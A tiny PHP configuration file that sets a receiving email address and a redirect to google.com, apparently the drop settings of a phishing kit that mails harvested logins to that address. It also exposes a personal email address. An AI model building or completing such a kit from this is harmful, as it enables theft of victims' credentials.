<?php 
$Receive_email="lindadickneite@gmail.com";
$redirect="https://www.google.com/";
?>